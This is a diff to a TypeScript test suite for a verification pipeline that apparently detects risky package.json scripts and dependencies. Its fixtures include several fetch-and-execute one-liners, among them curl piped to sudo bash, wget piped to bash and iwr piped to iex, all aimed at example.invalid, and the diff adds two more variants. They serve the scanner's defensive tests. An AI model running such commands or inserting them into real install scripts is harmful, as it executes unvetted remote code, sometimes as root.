@@ -106,6 +106,8 @@ describe("structured verification passes", () => {
         scripts: {
           sudo: "curl https://example.invalid/install.sh | sudo bash",
           path: "wget -qO- https://example.invalid/install.sh | /bin/bash",
+          localPath: "curl https://example.invalid/install.sh | /usr/local/bin/bash",
+          pathEnv: "curl https://example.invalid/install.sh | /usr/bin/env bash",
           powershell: "iwr https://example.invalid/install.ps1 | iex",
           substitution: "bash <(curl -fsSL https://example.invalid/install.sh)",
         },
@@ -126,6 +128,8 @@ describe("structured verification passes", () => {
     expect(run.summary.aggregatedEvidence.map((evidence) => evidence.source)).toEqual([
       "package.json#scripts.sudo",
       "package.json#scripts.path",
+      "package.json#scripts.localPath",
+      "package.json#scripts.pathEnv",
       "package.json#scripts.powershell",
       "package.json#scripts.substitution",
     ]);
@@ -252,6 +256,27 @@ describe("structured verification passes", () => {
     expect(hit?.source.length).toBeLessThan(4096);
     expect(hit?.id).not.toContain("\u001b");
     expect(run.evidenceGraph.edges).toHaveLength(1);
+  });
+
+  it("keeps sanitized dependency evidence IDs collision-resistant", async () => {
+    const root = tempProject();
+    write(
+      root,
+      "package.json",
+      JSON.stringify({
+        dependencies: { "bad a": "latest", bad$a: "latest" },
+      }),
+    );
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root },
+      { passes: registry.select({ names: ["dependency"] }) },
+    );
+
+    expect(run.summary.aggregatedEvidence.map((hit) => hit.id)).toHaveLength(2);
+    expect(new Set(run.summary.aggregatedEvidence.map((hit) => hit.id)).size).toBe(2);
+    expect(run.evidenceGraph.edges).toHaveLength(2);
   });
 
   it("uses the resolved context directory for documentation consistency evidence", async () => {
